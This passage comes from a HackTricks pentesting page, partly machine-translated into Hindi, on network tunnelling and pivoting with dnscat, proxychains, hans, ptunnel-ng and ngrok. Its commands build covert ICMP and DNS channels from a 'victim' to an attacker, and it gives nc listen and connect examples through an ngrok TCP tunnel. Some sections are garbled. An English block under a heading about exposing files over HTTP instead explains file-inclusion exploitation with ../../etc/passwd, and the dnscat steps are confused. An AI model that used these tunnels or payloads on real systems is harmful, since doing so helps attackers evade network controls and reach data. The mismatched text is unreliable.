3. Configure the DNS server to forward DNS queries to the target host.
4. Start the dnscat client on the client host and connect it to the DNS server.
5. Start the dnscat server on the target host and configure it to listen for incoming connections.
6. Test the port forwarding by sending network traffic through the dnscat channel.

Port forwarding with dnscat can be a powerful technique for bypassing network restrictions and establishing covert communication channels. However, it is important to use this technique responsibly and within the boundaries of the law.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### प्रॉक्सीचेन्स DNS बदलें

प्रॉक्सीचेन्स `gethostbyname` libc कॉल को अंतर्ग्रहण करता है और टीसीपी DNS अनुरोध को सॉक्स प्रॉक्सी के माध्यम से टनल करता है। **डिफ़ॉल्ट** रूप से प्रॉक्सीचेन्स द्वारा उपयोग किया जाने वाला **DNS** सर्वर **4.2.2.2** है (हार्डकोड किया गया)। इसे बदलने के लिए, फ़ाइल को संपादित करें: _/usr/lib/proxychains3/proxyresolv_ और IP को बदलें। यदि आप **Windows परिवेश** में हैं, तो आप **डोमेन कंट्रोलर** का IP सेट कर सकते हैं।

## गो में टनल

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP टनलिंग

### हांस

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

दोनों सिस्टम में टन एडाप्टर बनाने और ICMP इको अनुरोधों का उपयोग करके उनके बीच डेटा टनल करने के लिए रूट की आवश्यकता होती है।
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

****[**यहां से इसे डाउनलोड करें**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) एक टूल है जो एक कमांड लाइन में इंटरनेट पर समाधानों को उभारने के लिए उपयोग होता है।**
*उभारने का URI इस प्रकार होता है:* **UID.ngrok.io**

### स्थापना

- एक खाता बनाएं: https://ngrok.com/signup
- क्लाइंट डाउनलोड करें:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### मूलभूत उपयोग

**दस्तावेज़ीकरण:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*यदि आवश्यक हो तो प्रमाणीकरण और TLS भी जोड़ा जा सकता है।*

#### TCP टनलिंग
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP के साथ फ़ाइलों को उजागर करना

To expose files using HTTP, you can use a technique called file inclusion. This technique allows you to include files from a remote server into a web page. By exploiting this vulnerability, you can access and download sensitive files that are not intended to be publicly accessible.

To perform file inclusion, you need to identify the vulnerable parameter in the URL. This parameter is usually used to specify the file to be included. By manipulating this parameter, you can trick the server into including a file of your choice.

Here is an example of how to exploit file inclusion using HTTP:

1. Identify the vulnerable parameter in the URL, such as `file=`.
2. Craft a payload that includes the file you want to expose. For example, `file=../../../../etc/passwd` to access the `/etc/passwd` file.
3. Send the modified request to the server and observe the response. If successful, the server will include the specified file in the response.
4. Analyze the response to extract the exposed file. You can do this by viewing the page source or using a tool like Burp Suite.

It is important to note that file inclusion vulnerabilities can lead to serious security risks, as they can expose sensitive information and allow unauthorized access to the server. Therefore, it is crucial to patch and secure any vulnerabilities found during the testing process.
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP कॉल को स्निफ करना

*XSS, SSRF, SSTI के लिए उपयोगी...*
stdout से सीधे या HTTP इंटरफेस [http://127.0.0.1:4040](http://127.0.0.1:4000) में।

#### आंतरिक HTTP सेवा को टनल करना
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml का सरल विन्यास उदाहरण

इसमें 3 टनल खोलता है:
- 2 TCP
- 1 HTTP जिसमें /tmp/httpbin/ से स्थायी फ़ाइलों का प्रदर्शन होता है
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## जांचने के लिए अन्य उपकरण

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके।**

</details>
